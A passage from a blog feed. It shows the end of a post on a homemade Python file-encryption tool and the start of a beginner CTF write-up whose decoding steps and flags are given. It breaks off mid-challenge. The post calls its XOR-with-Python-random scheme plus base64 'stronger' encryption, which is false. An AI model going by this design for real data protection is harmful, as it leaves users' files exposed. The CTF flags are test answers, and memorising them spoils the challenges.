&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;The &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;{}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; is encrypted and saved in files directory..&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;format&lt;&#x2F;span&gt;&lt;span&gt;(menu[choice]))
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The encryption is done with the xor operation. The random.seed and base64 encoding is used to make the encryption stronger. The user can input his&#x2F;her password called key as while encrypting the file. The key is the only way to decrypt the encrypted file.&lt;&#x2F;p&gt;
&lt;p&gt;If we encrypted our image successfully, the encrypted image will be saved at files folder. We can share this encrypted file to anyone but no one can view the actual image. To get the actual image we have to decrypt the image by specifiying the key which is used for encryption. The decryption process is done by the
&lt;code&gt;decrypt&lt;&#x2F;code&gt; function.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decrypt&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;source_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;choice&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;	file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;files&#x2F;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;source_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;rb&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	data &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	b_array &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;bytearray&lt;&#x2F;span&gt;&lt;span&gt;(base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;b64decode&lt;&#x2F;span&gt;&lt;span&gt;(data))
&lt;&#x2F;span&gt;&lt;span&gt;	key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;input&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Enter Key to decrypt image : &amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;seed&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;CH4R4NU&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;key)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(b_array)):
&lt;&#x2F;span&gt;&lt;span&gt;		k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getrandbits&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		b_array[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;b_array[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;k 
&lt;&#x2F;span&gt;&lt;span&gt;	file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;source_file:
&lt;&#x2F;span&gt;&lt;span&gt;		ext &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;source_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;split&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]
&lt;&#x2F;span&gt;&lt;span&gt;		source_file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;files&#x2F;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;source_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;(ext)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;_decrypted&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;ext
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(source_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;wb&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;		source_file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;.&#x2F;files&#x2F;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;source_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;_decrypted&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;		file &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(source_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;wb&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;	file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(b_array)
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isdecrypted&lt;&#x2F;span&gt;&lt;span&gt;(source_file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;choice)
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The bytes of the encrypted image file is decoded first from the base64, then the function asking the key and setting up the same random seed which is used in the encryption. Then the xor operation is performed, the bytes are written into a file and saved it in files folder. At the end of the decrypt function the
&lt;code&gt;isdecrypted()&lt;&#x2F;code&gt; is called.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isdecrypted&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;choice&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;-&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;   typ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;magic&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from_file&lt;&#x2F;span&gt;&lt;span&gt;(file&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;mime&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;text&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;typ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;7&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;   	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Text File is decrypted and saved in files directory..:-)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;image&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;typ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;6&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;   	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Image is decrypted and saved in files directory..:-)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;audio&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;typ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;8&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;   	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Audio file is decrypted and saved in files directory..:-)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;video&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;typ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;   	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Video is decrypted and saved in files directory..:-)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;text&#x2F;plain&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;typ ) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;and &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;   	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;File is decrypted and saved in files directory..:-)&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;   	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;The key is wrong...&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;   	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;exit&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;   &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;-&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;50&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The isdecrypted function is checking wheather the decrypted image is valid or not. The magical numbers of the image is being tested by the magic module.
If the magical numbers are matched the function is going to tell that the decryption is successfull, if not the function will tell that the key is wrong to decrypt. If the key is wrong the program is going to be exited.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;requirements&quot;&gt;Requirements&lt;&#x2F;h3&gt;
&lt;p&gt;You require these additional modules&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;base64&lt;&#x2F;li&gt;
&lt;li&gt;magic&lt;&#x2F;li&gt;
&lt;li&gt;os&lt;&#x2F;li&gt;
&lt;li&gt;random&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;These modules will be pre installed on every system, if not then install them with &lt;code&gt;pip3 or pip&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;You need to copy your file and paste it in files folder of present in the SecureFiles folder to encrypt or decrypt the file
{: .prompt-info}&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h3 id=&quot;installation&quot;&gt;Installation&lt;&#x2F;h3&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;git clone https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;SecureFiles.git
&lt;&#x2F;span&gt;&lt;span&gt;cd SecureFiles
&lt;&#x2F;span&gt;&lt;span&gt;python3 SecureFiles.py
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;preview&quot;&gt;Preview&lt;&#x2F;h3&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;project_img&#x2F;securefiles&#x2F;securefiles.png&quot; alt=&quot;Preview&quot; &#x2F;&gt;{: w=&quot;600&quot;,h=&quot;600&quot;}&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;If anything should be modified in the script please let me know.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;You can find complete source code of SecureFiles here : &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;SecureFiles&quot;&gt;https:&#x2F;&#x2F;github.com&#x2F;TheMj0ln1r&#x2F;SecureFiles&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Cryptoverse CTF 2022</title>
        <published>2022-10-24T00:00:00+00:00</published>
        <updated>2022-10-24T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://themj0ln1r.github.io/writeups/cryptoverse22/"/>
        <id>https://themj0ln1r.github.io/writeups/cryptoverse22/</id>
        
        <content type="html" xml:base="https://themj0ln1r.github.io/writeups/cryptoverse22/">&lt;p&gt;Hi friends!&lt;&#x2F;p&gt;
&lt;p&gt;I played another CTF named Cryptoverse CTF 2022.
Cryptoverse CTF 2022 is a beginner-friendly CTF organized by an individual who is particularly interested in Cryptography and Reverse Engineering.&lt;&#x2F;p&gt;
&lt;p&gt;Let me explain the challs i solved in Cryptoverse CTF 2022.&lt;&#x2F;p&gt;
&lt;h1 id=&quot;baby-reverse&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#baby-reverse&quot; aria-label=&quot;Anchor link for: baby-reverse&quot;&gt;Baby Reverse&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;This is a basic reverse challenge.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf22&#x2F;babyreverse1.png&quot; alt=&quot;baby_reverse&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This can be solved by using strings command in linux&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; strings chall
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : cvctf{7h15_15_4_f4k3_fl4g}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;crypto-warmup-1&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto-warmup-1&quot; aria-label=&quot;Anchor link for: crypto-warmup-1&quot;&gt;Crypto&#x2F;Warmup 1&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf22&#x2F;cryptowarmup1.png&quot; alt=&quot;crypto&#x2F;warmup1&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The task is to decode the base64 cipher &quot;cGlwZ3N7cG5yZm5lXzY0X3Nnan0=&quot;.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; echo &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;cGlwZ3N7cG5yZm5lXzY0X3Nnan0=&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;base64&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; -d
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; pipgs{pnrfne_64_sgj}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then do a rot13 on the deciphered text.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; echo &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;pipgs{pnrfne_64_sgj}&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;| &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;rot13
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; cvctf{caesar_64_ftw}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Flag : cvctf{caesar_64_ftw}&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;hr &#x2F;&gt;
&lt;h1 id=&quot;crypto-warmup-2&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto-warmup-2&quot; aria-label=&quot;Anchor link for: crypto-warmup-2&quot;&gt;Crypto&#x2F;Warmup 2&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;assets&#x2F;img&#x2F;ctf_img&#x2F;cvctf22&#x2F;cryptowarmup2.png&quot; alt=&quot;crypto&#x2F;warmup2&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;The cipher is fzvxw{hqtegmfr_lw_msf_scrslg_kvwlhyk_fpr_kxg?} which is a vegener cipher and the key to decrypt the cipher is determination.
